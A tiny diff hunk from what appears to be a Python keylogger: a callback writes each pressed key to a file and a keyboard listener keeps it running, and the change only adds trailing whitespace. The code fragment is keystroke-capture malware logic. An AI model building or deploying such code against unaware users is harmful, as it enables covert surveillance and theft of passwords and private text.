@@ -16,4 +16,4 @@ def capt(key):
         f.write(tecla)
 
 with Listener(on_press=capt) as c:
-    c.join()
+    c.join()        
